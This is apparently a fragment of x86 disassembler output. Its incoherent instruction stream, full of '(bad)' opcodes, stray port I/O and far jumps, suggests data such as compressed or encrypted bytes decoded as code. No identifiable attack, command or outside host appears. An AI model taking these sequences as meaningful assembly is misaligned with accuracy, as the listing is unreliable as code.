  414426:	jns    0x414435
  414428:	pushf  
  414429:	xor    DWORD PTR [esi-0x73a505f6],eax
  41442f:	rol    esp,1
  414431:	mov    al,ds:0xe75e77a4
  414436:	int    0x92
  414438:	(bad)
  41443c:	jo     0x4143c3
  41443e:	mov    esp,DWORD PTR [ebx-0x3d]
  414441:	mov    ds:0x448c315c,al
  414446:	scas   al,BYTE PTR es:[edi]
  414447:	sbb    esp,DWORD PTR [eax+0x4557c126]
  41444d:	loope  0x414475
  41444f:	xor    BYTE PTR [esi-0x53a19c78],dl
  414455:	pop    ss
  414456:	push   edi
  414457:	lods   al,BYTE PTR ds:[esi]
  414458:	cmp    DWORD PTR [esp+esi*2-0x53],ebp
  41445c:	xor    eax,0xa35c95b3
  414461:	push   ebp
  414462:	and    al,0xe9
  414464:	iret   
  414465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414466:	icebp  
  414467:	pop    esi
  414468:	pop    es
  414469:	push   es
  41446a:	sbb    DWORD PTR [ebx-0x39],ecx
  41446d:	jp     0x41446d
  41446f:	mov    eax,0x4f26741e
  414474:	dec    esp
  414475:	les    eax,FWORD PTR [edx]
  414477:	idiv   dl
  414479:	pop    edx
  41447a:	jns    0x4144d6
  41447c:	call   0xa8964a43
  414481:	stos   BYTE PTR es:[edi],al
  414482:	mov    ah,0x73
  414484:	ins    BYTE PTR es:[edi],dx
  414485:	add    DWORD PTR [edx-0x3d2f2da5],ebp
  41448b:	loope  0x4144ea
  41448d:	out    dx,al
  41448e:	xor    ecx,DWORD PTR [ebx]
	...
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x31]
  414501:	loope  0x414551
  414503:	outs   dx,BYTE PTR ds:[esi]
  414504:	in     al,dx
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	(bad)  
  41450d:	push   eax
  41450e:	popa   
  41450f:	cdq    
  414510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414511:	scas   eax,DWORD PTR es:[edi]
  414512:	cmp    al,0x95
  414514:	cmp    dh,dl
  414516:	(bad)  
  414517:	addr16 jmp 0x9a6e6095
  41451d:	jle    0x414567
  41451f:	popa   
  414520:	xor    DWORD PTR [ecx+ebx*8],ebp
  414523:	stos   BYTE PTR es:[edi],al
  414524:	add    ah,BYTE PTR [esp+eax*1-0x44bc43d2]
  41452b:	lock outs dx,BYTE PTR gs:[esi]
  41452e:	or     DWORD PTR [edx],0xffffffa9
  414531:	bound  edi,QWORD PTR [edi]
  414533:	and    BYTE PTR [edi+0x8],ah
  414536:	ins    DWORD PTR es:[edi],dx
  414537:	popa   
  414538:	aaa    
  414539:	jo     0x4144ed
  41453b:	retf   0xd88c
  41453e:	add    DWORD PTR [ebp-0x505b8c87],edx
  414544:	call   0xfe25e4a2
  414549:	shl    BYTE PTR [ebp+ebx*4+0x21],0x8b
  41454e:	jl     0x4145b8
  414550:	cmp    bl,BYTE PTR [eax+0x39eadef9]
  414556:	or     dl,bl
  414558:	or     bl,BYTE PTR [ebx-0x1a]
  41455b:	cmp    al,0xc2
  41455d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41455e:	adc    al,0xe4
  414560:	inc    ebx
  414561:	loopne 0x414514
  414563:	mov    ebp,0xd4bb0cc6
  414568:	stos   DWORD PTR es:[edi],eax
  414569:	mov    ch,0xb9
  41456b:	mov    al,ds:0x71147992
  414570:	xchg   BYTE PTR [ebp+eax*4+0x42],bl
  414574:	cmp    BYTE PTR [ecx-0x21],cl
  414577:	sub    BYTE PTR ds:0x291fd56c,0x30
  41457e:	sbb    dl,BYTE PTR [esi]
  414580:	push   0x49
  414582:	inc    ecx
  414583:	jle    0x414508
  414585:	lahf   
  414586:	mov    edi,0xc9101983
  41458b:	cmc    
  41458c:	cmp    eax,0x3eaaf04
  414591:	neg    DWORD PTR [esi+0x24]
  414594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414595:	add    ebx,ecx
  414597:	xchg   edx,eax
  414598:	ror    esp,cl
  41459a:	push   eax
  41459b:	call   DWORD PTR ds:0xcab529b1
  4145a1:	push   es
  4145a2:	pop    edi
  4145a3:	inc    edi
  4145a4:	mov    eax,ds:0x96213a3e
  4145a9:	inc    esi
  4145aa:	cmp    BYTE PTR [ebp-0x3b],bh
  4145ad:	and    BYTE PTR [edx-0x5a],dh
  4145b0:	mov    esp,0xedd1c79a
  4145b5:	and    dl,BYTE PTR [esp+edi*2+0x72212cee]
  4145bc:	sahf   
  4145bd:	or     BYTE PTR [ecx-0x54],al
  4145c0:	jmp    0x37d5e085
  4145c5:	ins    BYTE PTR es:[edi],dx
  4145c6:	loop   0x4145f7
  4145c8:	lock into 
  4145ca:	inc    ecx
  4145cb:	jo     0x4145a8
  4145cd:	loope  0x414560
  4145cf:	and    esp,DWORD PTR [edx]
  4145d1:	hlt    
  4145d2:	cwde   
  4145d3:	adc    cl,BYTE PTR [eax]
  4145d5:	mov    ds:0xe975297a,al
  4145da:	cmp    al,0xe
  4145dc:	pop    ecx
  4145dd:	jmp    0x3553:0xc9c63ad2
  4145e4:	cwde   
  4145e5:	in     al,0x9c
  4145e7:	loope  0x414629
  4145e9:	(bad)  
  4145ea:	in     al,0xac
  4145ec:	add    al,0x40
  4145ee:	pushf  
  4145ef:	cmp    ah,cl
  4145f1:	push   edx
  4145f2:	inc    ebp
  4145f3:	cmc    
  4145f4:	pop    ecx
  4145f5:	push   ss
  4145f6:	sti    
  4145f7:	div    DWORD PTR ds:0x61e93e64
  4145fd:	xor    edx,DWORD PTR [esi+0x46]
  414600:	add    al,0xab
  414602:	int3   
  414603:	cmp    al,0xd7
  414605:	scas   al,BYTE PTR es:[edi]
  414606:	mov    dh,0x43
  414608:	xor    al,0x9b
  41460a:	call   0xda:0x6a446848
	...
  414671:	add    BYTE PTR [eax],al
  414673:	add    BYTE PTR [edi+0x5e],bh
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0xff
  414681:	jb     0x414646
  414683:	hlt    
  414684:	lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41468d:	mov    edi,0x1c4037da
  414692:	fdivr  DWORD PTR [esi+0x2b12a0c1]
  414698:	or     eax,0xdd8482bd
  41469d:	ja     0x414689
  41469f:	xchg   DWORD PTR [edx+0x3e58a7a5],esi
  4146a5:	js     0x414712
  4146a7:	add    edx,esp
  4146a9:	ret    
  4146aa:	retf   
  4146ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146ac:	js     0x414714
  4146ae:	add    DWORD PTR ds:0xc7564959,ebp
  4146b4:	out    0xf0,eax
  4146b6:	jae    0x414703
  4146b8:	or     dh,BYTE PTR [ebx+0x48]
  4146bb:	int    0x20
  4146bd:	popf   
  4146be:	cs push edi
  4146c0:	sub    DWORD PTR [ecx-0x3d],eax
  4146c3:	retf   0xf3dc
  4146c6:	vmovss xmm1,xmm3,xmm2
  4146ca:	xchg   DWORD PTR [eax],ebp
  4146cc:	add    al,0xbb
  4146cf:	cmp    edi,ebp
  4146d1:	mov    dl,0xb
  4146d3:	dec    esi
  4146d4:	call   0xcf7c503f
  4146d9:	les    ebx,FWORD PTR [ebp-0x1b]
  4146dc:	retf   
  4146dd:	adc    eax,0x614511ee
  4146e2:	imul   esi,DWORD PTR [ecx+0x192e5843],0xfffffff1
  4146e9:	sub    ah,BYTE PTR [ebx+edi*4-0x6dd13396]
  4146f0:	jp     0x414674
  4146f2:	cwde   
  4146f3:	(bad)
  4146f6:	jmp    0x682407fb
  4146fb:	lahf   
  4146fc:	in     eax,dx
  4146fd:	icebp  
  4146fe:	test   BYTE PTR [esi-0x3c],0x91
  414702:	cs push 0xec8d6bc3
  414708:	fs cmp al,bh
  41470b:	xchg   esi,eax
  41470c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41470d:	mov    ecx,0xe76df936
  414712:	xchg   ch,dl
  414714:	fst    QWORD PTR [ebx+0x4c63bd66]
  41471a:	stos   BYTE PTR es:[edi],al
  41471b:	mov    esp,eax
  41471d:	fcmovbe st,st(5)
  41471f:	cmp    dh,bh
  414721:	or     bl,al
  414723:	mov    BYTE PTR [eax],ah
  414725:	in     al,0xad
  414727:	cmc    
  414728:	(bad)  
  41472a:	sbb    dl,BYTE PTR [esi]
  41472c:	and    BYTE PTR [ebp-0xe7dd6aa],bl
  414732:	rcr    ch,cl
  414734:	icebp  
  414735:	push   eax
  414736:	icebp  
  414737:	jne    0x4146d3
  414739:	je     0x41472b
  41473b:	jmp    0x4146e2
  41473d:	(bad)  
  41473e:	xor    DWORD PTR [edi-0x32],ebp
  414741:	or     eax,0x31916bcb
  414746:	jmp    0x437d00cd
  41474b:	mov    ebx,0x125a2b69
  414750:	out    0x46,al
  414752:	sub    ebp,0xffffff9a
  414755:	fwait
  414756:	cmp    eax,0x134215b8
  41475b:	(bad)  
  41475c:	sbb    eax,esi
  41475e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41475f:	push   edx
  414760:	push   0x1a6eda23
  414765:	cmp    dh,BYTE PTR [edi]
  414767:	xchg   ebp,eax
  414768:	push   0x66
  41476a:	jecxz  0x4147bd
  41476c:	dec    esi
  41476d:	push   0x78
  41476f:	mov    ebx,0xa3bec76
  414774:	sar    BYTE PTR [ebp+0x7c5ccfe6],0xc8
  41477b:	ins    BYTE PTR es:[edi],dx
  41477c:	in     al,dx
  41477d:	jle    0x4147be
  41477f:	stc    
  414780:	add    BYTE PTR [eax],0x96
  414783:	popa   
  414784:	mov    eax,ds:0x6fcaeec1
  414789:	out    dx,al
  41478a:	rcl    DWORD PTR [esi+0x706c3d47],0x0
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xcde8f289
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	pop    edi
  41480d:	sub    bl,dh
  41480f:	xchg   ecx,eax
  414810:	test   BYTE PTR [edi],bl
  414812:	xor    edi,eax
  414814:	sub    al,0xcd
  414816:	jae    0x41484a
  414818:	and    eax,0x6bb46288
  41481d:	mov    ds:0xd8c0e5b5,al
  414822:	pop    edx
  414823:	lock xor dh,dl
  414826:	test   eax,0x177b4994
  41482b:	jne    0x4148a7
  41482d:	mov    al,ds:0x14964bd9
  414832:	push   esi
  414833:	fcmovbe st,st(3)
  414835:	inc    ecx
  414836:	stc    
  414837:	mov    ah,0xf9
  414839:	mov    ds:0xc4334c2,eax
  41483e:	jns    0x414802
  414840:	outs   dx,BYTE PTR ds:[esi]
  414841:	sbb    DWORD PTR [ebx],ebp
  414843:	pop    ecx
  414844:	jbe    0x41488a
  414846:	adc    al,0x37
  414848:	loop   0x4148a4
  41484a:	les    ecx,FWORD PTR [edi+0x5ead3eeb]
  414850:	sbb    eax,0xb0069933
  414855:	and    eax,0x348a5305
  41485a:	jns    0x414800
  41485c:	cmp    ch,dl
  41485e:	es adc eax,0x497e87b
  414864:	lock jnp 0x414852
  414867:	mov    al,ds:0x691ceb60
  41486c:	sti    
  41486d:	jmp    0x494dcf35
  414872:	fisubr DWORD PTR ds:0x8e0872b7
  414878:	push   0xbcc7ea0a
  41487d:	sbb    eax,ebp
  41487f:	pop    ss
  414880:	jo     0x414807
  414882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414883:	mov    edx,0xa78894f2
  414888:	or     dh,BYTE PTR [edx]
  41488a:	jno    0x414864
  41488c:	sbb    DWORD PTR [edi+0x2ef15609],0x38
  414893:	xchg   ecx,eax
  414894:	pop    edx
  414895:	fwait
  414896:	lods   eax,DWORD PTR ds:[esi]
  414897:	stos   BYTE PTR es:[edi],al
  414898:	je     0x414877
  41489a:	fild   DWORD PTR [ebx]
  41489c:	in     eax,dx
  41489d:	cmc    
  41489e:	and    BYTE PTR [ebx-0x50],ch
  4148a1:	mov    eax,ds:0xfd3bec25
  4148a6:	lahf   
  4148a7:	and    ebx,DWORD PTR [edi-0x46]
  4148aa:	imul   edx,DWORD PTR [ebx+0x48d66ba6],0x38
  4148b1:	sub    esi,esp
  4148b3:	mov    ds:0xaf02718b,al
  4148b8:	lahf   
  4148b9:	jp     0x41483d
  4148bb:	imul   ecx,DWORD PTR cs:0xbcae3a35,0x65f0cc9f
  4148c6:	cmp    esp,ebp
  4148c8:	sbb    ecx,ecx
  4148ca:	mov    ch,0xe8
  4148cc:	pop    ebx
  4148cd:	and    edi,eax
  4148cf:	lahf   
  4148d0:	xchg   BYTE PTR [ebx-0x20],bh
  4148d3:	inc    edx
  4148d4:	pop    ebx
  4148d5:	xchg   BYTE PTR [edi+esi*1+0x2],cl
  4148d9:	xchg   DWORD PTR [esi+ebx*8],ecx
  4148dc:	leave  
  4148dd:	jecxz  0x4148c6
  4148df:	cdq    
  4148e0:	dec    ebx
  4148e1:	enter  0xe0d7,0xef
  4148e5:	jns    0x414896
  4148e7:	imul   eax,DWORD PTR [edx+0x593afb5a],0x76cf0f6b
  4148f1:	pushf  
  4148f2:	pop    ecx
  4148f3:	lock or BYTE PTR [eax+eiz*2-0x46],cl
  4148f8:	fwait
  4148f9:	sti    
  4148fa:	sti    
  4148fb:	je     0x4148e7
  4148fd:	xor    eax,0x5ed94749
  414902:	xchg   ecx,eax
  414903:	icebp  
  414904:	xchg   edx,eax
  414905:	dec    edx
  414906:	(bad)  
  414907:	cmp    ecx,DWORD PTR [eax-0x705cc78c]
  41490d:	xchg   esp,eax
  41490e:	dec    ecx
  41490f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	(bad)  
  414981:	sbb    edx,DWORD PTR [edx-0x66]
  414984:	clc    
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	and    ch,BYTE PTR [esi]
  41498e:	adc    al,0x29
  414990:	add    eax,0x64b1bac8
  414995:	lahf   
  414996:	push   ss
  414997:	ds ret 0xdf7a
  41499b:	outs   dx,DWORD PTR ds:[esi]
  41499c:	inc    ecx
  41499d:	mov    dl,0xf5
  41499f:	fwait
  4149a0:	inc    ebp
  4149a1:	push   edi
  4149a2:	lods   eax,DWORD PTR ds:[esi]
  4149a3:	sbb    eax,DWORD PTR [eax-0x7abf720e]
  4149a9:	ins    BYTE PTR es:[edi],dx
  4149aa:	mov    bh,0x59
  4149ac:	fwait
  4149ad:	add    al,0xf
  4149af:	cdq    
  4149b0:	test   DWORD PTR [edx+0x51ed7840],ecx
  4149b6:	gs inc edx
  4149b8:	and    eax,0x47eea6aa
  4149bd:	adc    ecx,0xfffffffc
  4149c0:	les    ecx,FWORD PTR [eax+0x7325aacf]
  4149c6:	add    ebx,DWORD PTR [ebx]
  4149c8:	xor    BYTE PTR [ebp+ecx*2-0x621e22c0],ah
  4149cf:	adc    bl,BYTE PTR [edx-0x7efd3a31]
  4149d5:	dec    edi
  4149d6:	push   ss
  4149d7:	dec    esi
  4149d8:	mov    ebp,0xd8986989
  4149dd:	scas   eax,DWORD PTR es:[edi]
  4149de:	push   ss
  4149df:	xlat   BYTE PTR ds:[ebx]
  4149e0:	(bad)  [ebp-0x5b20d704]
  4149e6:	bound  ebp,QWORD PTR [edx+0x4d2f9b0a]
  4149ec:	jbe    0x414a14
  4149ee:	pusha  
  4149ef:	dec    edi
  4149f0:	xor    al,0xd1
  4149f2:	outs   dx,DWORD PTR ds:[esi]
  4149f3:	arpl   WORD PTR ds:0x7d44a14b,di
  4149f9:	xor    BYTE PTR [esi],ah
  4149fb:	sar    BYTE PTR [ecx],cl
  4149fd:	(bad)
  414a00:	push   0x68
  414a02:	or     dl,BYTE PTR [eax+0x53d269b1]
  414a08:	or     al,0xd5
  414a0a:	loopne 0x414a64
  414a0c:	loop   0x4149ac
  414a0e:	mov    esp,0x8e8872ae
  414a13:	lods   al,BYTE PTR ds:[esi]
  414a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a15:	push   ebp
  414a16:	jp     0x414a4d
  414a18:	or     bl,ah
  414a1a:	(bad)  
  414a1b:	pop    edx
  414a1c:	(bad)  
  414a1d:	into   
  414a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a1f:	cdq    
  414a20:	ja     0x414a82
  414a22:	and    ebp,DWORD PTR [ebx+0x76]
  414a25:	inc    ebp
  414a26:	fldenv [esi+0x2a]
  414a29:	and    al,0x2b
  414a2b:	jg     0x414a0b
  414a2d:	lods   al,BYTE PTR ds:[esi]
  414a2e:	add    BYTE PTR [ecx-0x7e],al
  414a31:	adc    eax,DWORD PTR [ecx]
  414a33:	fstp   QWORD PTR [ebp-0x60]
  414a36:	sbb    esp,DWORD PTR [eax+0x47]
  414a39:	sahf   
  414a3a:	js     0x414a1d
  414a3c:	or     DWORD PTR [ecx+0x478b1bb9],eax
  414a42:	in     al,dx
  414a43:	jmp    0x15ae:0xef3b5625
  414a4a:	mov    ds:0x7ab09c42,eax
  414a4f:	cdq    
  414a50:	jno    0x414a56
  414a52:	test   eax,0xd16afab7
  414a57:	or     DWORD PTR [edi],esi
  414a59:	cdq    
  414a5a:	dec    esp
  414a5b:	sub    ecx,DWORD PTR [eax+0x7bd17164]
  414a61:	or     BYTE PTR [ebx+ebx*1],0x17
  414a65:	rol    BYTE PTR [eax-0x3a3031db],0xd4
  414a6c:	movhps QWORD PTR [ebx+0x750de57],xmm1
  414a73:	lods   eax,DWORD PTR ds:[esi]
  414a74:	inc    esi
  414a75:	cmp    eax,0x7fb0f8a7
  414a7a:	mov    edx,0x5e0c5d64
  414a7f:	mov    esp,0x224723b9
  414a84:	jge    0x414add
  414a86:	xor    BYTE PTR [ebx],dl
  414a88:	push   ss
  414a89:	mov    ?,WORD PTR [ecx+0x47]
  414a8c:	jmp    0x414adf
  414a8e:	imul   DWORD PTR [ebx+0x0]
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   bx,dx
  414b01:	leave  
  414b02:	xchg   edx,eax
  414b03:	(bad)  
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	rol    esp,cl
  414b0e:	jp     0x414aec
  414b10:	adc    al,BYTE PTR [eax+0x572aac39]
  414b16:	sub    eax,0xeeec44f4
  414b1b:	inc    esp
  414b1c:	pop    es
  414b1d:	pop    esi
  414b1e:	imul   ebp,DWORD PTR [edi+0x2c],0x7db368d9
  414b25:	sub    ecx,DWORD PTR [edx-0x5b]
  414b28:	inc    esp
  414b29:	mov    ds:0xc1fee6b3,eax
  414b2e:	ror    al,cl
  414b30:	adc    al,0x13
  414b32:	sub    ch,bh
  414b34:	repz pop ebp
  414b36:	fwait
  414b37:	shr    dh,1
  414b39:	or     eax,DWORD PTR [eax+0x4ded6f30]
  414b3f:	aaa    
  414b40:	xor    ah,dl
  414b42:	shr    BYTE PTR [ebp+0x2e],1
  414b45:	fs xchg edx,eax
  414b47:	cmc    
  414b48:	in     al,0xbb
  414b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b4b:	dec    ecx
  414b4c:	icebp  
  414b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b4e:	jo     0x414ae3
  414b50:	rcr    DWORD PTR [eax],cl
  414b52:	div    DWORD PTR [eax+0x13]
  414b55:	test   eax,0x7a07163c
  414b5a:	(bad)
  414b5e:	rol    DWORD PTR [esi],1
  414b60:	in     al,dx
  414b61:	(bad)  
  414b62:	dec    edi
  414b63:	fisub  DWORD PTR [edx+ebx*4+0x12]
  414b67:	arpl   WORD PTR [ebp+0x22],bx
  414b6a:	xchg   edx,eax
  414b6b:	add    al,0x8a
  414b6d:	xchg   ebp,eax
  414b6e:	jecxz  0x414aff
  414b70:	dec    edi
  414b72:	dec    esi
  414b73:	shl    BYTE PTR [ebp+0x3ad405f6],cl
  414b79:	and    BYTE PTR [esi+0x2d904221],dl
  414b7f:	jbe    0x414b37
  414b81:	ret    
  414b82:	push   esp
  414b83:	pop    es
  414b84:	sub    eax,0xd306bc6a
  414b89:	jmp    0xfd715cca
  414b8e:	cmp    eax,0x6c5a959a
  414b93:	and    BYTE PTR [eax+0xfa1e20c],bh
  414b99:	mov    bh,0xa
  414b9b:	retf   0x465f
  414b9e:	(bad)  
  414b9f:	aaa    
  414ba0:	(bad)  
  414ba1:	or     esi,DWORD PTR [esi-0x5ae9d668]
  414ba7:	sbb    al,0x12
  414ba9:	pop    ecx
  414baa:	stos   DWORD PTR es:[edi],eax
  414bab:	scas   al,BYTE PTR es:[edi]
  414bac:	xor    al,0xb6
  414bae:	xchg   ebx,eax
  414baf:	sbb    eax,0xc1731c44
  414bb4:	mov    ax,ds:0x76947add
  414bba:	pop    esi
  414bbb:	lods   eax,DWORD PTR ds:[esi]
  414bbc:	add    BYTE PTR [ebx-0xb],dh
  414bbf:	xchg   DWORD PTR [esi+eax*2-0x25],ebx
  414bc3:	fcmovnu st,st(6)
  414bc5:	in     al,dx
  414bc6:	int    0x29
  414bc8:	dec    esi
  414bc9:	cs push cs
  414bcb:	inc    esi
  414bcc:	jae    0x414c07
  414bce:	pushf  
  414bcf:	rol    DWORD PTR [esi],cl
  414bd1:	imul   ebx,ecx,0xffffffa6
  414bd4:	inc    ecx
  414bd5:	gs sbb ah,bh
  414bd8:	xor    ch,BYTE PTR [edx]
  414bda:	cmp    BYTE PTR [esi+edx*8+0x700912dc],bl
  414be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414be2:	and    DWORD PTR [ebp+0x6ca201b2],esi
  414be8:	into   
  414be9:	mov    ch,0x33
  414beb:	xor    bl,al
  414bed:	mov    edx,0xc642619d
  414bf2:	mov    cl,0xea
  414bf4:	xor    ah,cl
  414bf6:	push   0xffffffda
  414bf8:	loop   0x414c13
  414bfa:	ins    DWORD PTR es:[edi],dx
  414bfb:	sub    BYTE PTR [ecx+0x5836aac7],ah
  414c01:	sub    ebp,DWORD PTR [esi+0x2be671df]
  414c07:	test   eax,0xbdbb0733
  414c0c:	push   ds
  414c0d:	ja     0x414bba
  414c0f:	mov    cl,0x0
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ecx,DWORD PTR cs:[edx+edx*1]
  414c82:	push   ebx
  414c83:	test   eax,0xdb00
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	sbb    cl,bl
  414c8e:	push   0x58
  414c90:	xor    al,0x8e
  414c92:	or     eax,0x8e00cb60
  414c97:	in     al,0xa9
  414c99:	inc    eax
  414c9a:	and    DWORD PTR [ebx],eax
  414c9c:	daa    
  414c9d:	mov    WORD PTR [esi+0x48],?
  414ca0:	into   
  414ca1:	loope  0x414c24
  414ca3:	out    0xae,al
  414ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca6:	inc    eax
  414ca7:	sbb    esp,DWORD PTR [eax-0x71c9c4c4]
  414cad:	push   ss
  414cae:	ins    BYTE PTR es:[edi],dx
  414caf:	adc    eax,0xc8dcb28f
  414cb4:	mov    edi,0x69315b6
  414cb9:	imul   edi,ebp,0x2c7ddba3
  414cbf:	inc    ebx
  414cc0:	in     eax,0xfa
  414cc2:	push   ss
  414cc3:	scas   al,BYTE PTR es:[edi]
  414cc4:	adc    ebx,DWORD PTR [edx]
  414cc6:	dec    ebp
  414cc7:	push   ecx
  414cc8:	in     eax,dx
  414cc9:	sbb    eax,0xf17fdbd9
  414cce:	rcl    BYTE PTR [ecx+edx*2-0x42],1
  414cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cd3:	pushf  
  414cd4:	jno    0x414cd6
  414cd6:	bound  ebx,QWORD PTR [ebx]
  414cd8:	out    dx,eax
  414cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cda:	mov    bl,0x43
  414cdc:	xor    edi,DWORD PTR [ebp-0x6f]
  414cdf:	jl     0x414c73
  414ce1:	jmp    0x8a1b9072
  414ce6:	pop    es
  414ce7:	push   ss
  414ce8:	xor    bl,BYTE PTR [ebx+0x53]
  414ceb:	push   eax
  414cec:	jae    0x414cf2
  414cee:	and    DWORD PTR [ecx],0x7f
  414cf1:	mov    BYTE PTR [eax-0xcb4faa4],ah
  414cf7:	ss (bad) 
  414cf9:	fisub  WORD PTR [ebx]
  414cfb:	sub    dl,BYTE PTR [esp+eax*1-0x55]
  414cff:	or     ebp,esp
  414d01:	bnd data16 jne 0x414c99
  414d05:	call   0x135d:0x595d9a61
  414d0c:	cmc    
  414d0d:	inc    esi
  414d0e:	(bad)  
  414d0f:	mov    eax,cs:0x2f966207
  414d15:	in     eax,dx
  414d16:	jl     0x414d53
  414d18:	push   ebp
  414d19:	ret    
  414d1a:	(bad)  
  414d1b:	sub    cl,BYTE PTR gs:[eax+0x39]
  414d1f:	shl    DWORD PTR ds:0x22358fff,1
  414d25:	aas    
  414d26:	inc    eax
  414d27:	inc    edi
  414d28:	jns    0x414d6c
  414d2a:	mov    ah,0xec
  414d2c:	loop   0x414d98
  414d2e:	lods   al,BYTE PTR ds:[esi]
  414d2f:	fmul   DWORD PTR [ecx-0x6dcc7ffe]
  414d35:	bswap  esi
  414d37:	nop
  414d38:	jae    0x414cea
  414d3a:	sub    ebp,DWORD PTR [edi+0x76]
  414d3d:	pop    esi
  414d3e:	cmp    BYTE PTR [esi],al
  414d40:	mov    dh,0x43
  414d42:	xlat   BYTE PTR ds:[ebx]
  414d43:	jns    0x414da3
  414d45:	mov    ebp,0x6ae9670e
  414d4a:	and    al,0x6f
  414d4c:	sbb    BYTE PTR [eax+0x56],ah
  414d4f:	bound  edx,QWORD PTR [esi+0x3d]
  414d52:	loopne 0x414d48
  414d54:	ds (bad) 
  414d56:	std    
  414d57:	push   ebp
  414d58:	leave  
  414d59:	int    0x62
  414d5b:	mov    ebp,0xba8d2302
  414d60:	js     0x414d0d
  414d62:	cld    
  414d63:	and    edx,edi
  414d65:	push   cs
  414d66:	(bad)  
  414d67:	loope  0x414d51
  414d69:	retf   0x887d
  414d6c:	or     dl,BYTE PTR [ebp+0x399fe1e0]
  414d72:	mov    al,0x5
  414d74:	mov    edi,0xca4860e6
  414d79:	push   ss
  414d7a:	and    al,0x76
  414d7c:	pop    ds
  414d7d:	aam    0xa
  414d7f:	xchg   ebx,eax
  414d80:	scas   al,BYTE PTR es:[edi]
  414d81:	call   0x3209:0xa5bd394b
  414d88:	in     eax,0x1c
  414d8a:	push   esp
  414d8b:	mov    esi,0x14ca8457
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x2f21128f
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	(bad)  
  414e0e:	outs   dx,BYTE PTR ds:[esi]
  414e0f:	or     al,0x76
  414e11:	inc    esi
  414e12:	pop    es
  414e13:	lahf   
  414e14:	sub    BYTE PTR [ecx-0x37],0xdd
  414e18:	sub    ch,BYTE PTR [eax-0x25]
  414e1b:	out    dx,eax
  414e1c:	cdq    
  414e1d:	adc    al,0xb1
  414e1f:	jae    0x414e37
  414e21:	leave  
  414e22:	push   edi
  414e23:	aad    0x4
  414e25:	jl     0x414e14
  414e27:	ins    BYTE PTR es:[edi],dx
  414e28:	ins    DWORD PTR es:[edi],dx
  414e29:	mov    al,ds:0x1844b15c
  414e2e:	inc    esp
  414e2f:	and    BYTE PTR [eax],0xeb
  414e32:	adc    DWORD PTR [ecx+0x5263e51a],ecx
  414e38:	pusha  
  414e39:	jnp    0x414ea5
  414e3b:	and    dh,BYTE PTR [eax]
  414e3d:	mov    edx,0x4d997e46
  414e42:	add    al,0x7f
  414e44:	xchg   DWORD PTR [esi+0x2bc8504f],edi
  414e4a:	frstor [edi+0x41]
  414e4d:	xlat   BYTE PTR gs:[ebx]
  414e4f:	arpl   WORD PTR [edx+ecx*2],ax
  414e52:	mov    edx,0xe9b2f6aa
  414e57:	cwde   
  414e58:	fstp   DWORD PTR [eax+0x458ccef3]
  414e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
